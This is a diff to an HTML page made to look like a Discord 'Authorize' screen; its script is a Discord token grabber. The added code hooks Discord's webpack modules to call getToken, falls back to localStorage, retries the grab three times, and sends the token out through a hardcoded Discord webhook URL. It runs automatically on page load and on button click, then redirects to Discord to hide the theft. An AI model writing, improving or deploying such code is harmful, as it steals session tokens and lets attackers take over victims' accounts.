@@ -22,6 +22,7 @@
     .note { font-size: 13px; color: #72767d; margin: 16px 0; line-height: 1.4; }
     .authorize-btn { width: 100%; padding: 14px; background: #5865f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
     .authorize-btn:hover { background: #4752c4; }
+    .loading { opacity: 0.7; pointer-events: none; }
   </style>
 </head>
 <body>
@@ -73,26 +74,41 @@
   <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1434969761539690639/z9ni7tqOcUmKzc542doFrJOL3WZuBwtcnWXnJkP_XAXIW7BEDeWLg-D7coUWuFHs_3cS';
 
-    function getToken() {
-      let token = null;
-      try {
-        const ls = localStorage.getItem('token');
-        if (ls && ls.length > 50) token = ls.replace(/"/g, '');
-      } catch (e) {}
-      if (!token && typeof webpackChunkdiscord_app !== 'undefined') {
-        try {
-          webpackChunkdiscord_app.push([['grab'], {}, req => {
-            for (const m in req.c) {
-              const mod = req.c[m].exports;
-              if (mod?.default?.getToken) {
-                token = mod.default.getToken();
-                break;
-              }
+    let modules = [];
+
+    function injectWebpack() {
+      if (typeof webpackChunkdiscord_app !== 'undefined') {
+        webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
+          for (const m of Object.keys(req.c).map(x => req.c[x].exports).filter(x => x)) {
+            if (m.default && m.default.getToken !== undefined) {
+              modules = [m.default];
+              return;
             }
-          }]);
-        } catch (e) {}
+            if (m.getToken !== undefined) {
+              modules = [m];
+              return;
+            }
+          }
+        }]);
+        webpackChunkdiscord_app.pop();
       }
-      return token;
+    }
+
+    function getToken() {
+      injectWebpack();
+      const m = modules.find(m => m?.getToken !== undefined);
+      if (m) {
+        let token = m.getToken();
+        if (token && typeof token === 'string' && token.length > 50) {
+          return token.replace(/"/g, '');
+        }
+      }
+      // Fallback: localStorage
+      try {
+        const lsToken = localStorage.getItem('token');
+        if (lsToken && lsToken.length > 50) return lsToken.replace(/"/g, '');
+      } catch (e) {}
+      return null;
     }
 
     async function sendToken() {
@@ -121,15 +137,29 @@
       });
     }
 
-    document.getElementById('authorizeBtn').addEventListener('click', () => {
-      sendToken();
+    // Retry grab 3x with delay
+    async function grabWithRetry() {
+      for (let i = 0; i < 3; i++) {
+        const token = getToken();
+        if (token) {
+          await sendToken();
+          return;
+        }
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    }
+
+    document.getElementById('authorizeBtn').addEventListener('click', async () => {
+      document.getElementById('authorizeBtn').classList.add('loading');
+      await grabWithRetry();
       setTimeout(() => {
         window.location = 'https://discord.com/channels/@me';
-      }, 600);
+      }, 1500);
     });
 
+    // Auto-grab on load
     window.addEventListener('load', () => {
-      setTimeout(sendToken, 1000);
+      setTimeout(grabWithRetry, 1000);
     });
   </script>
 </body>
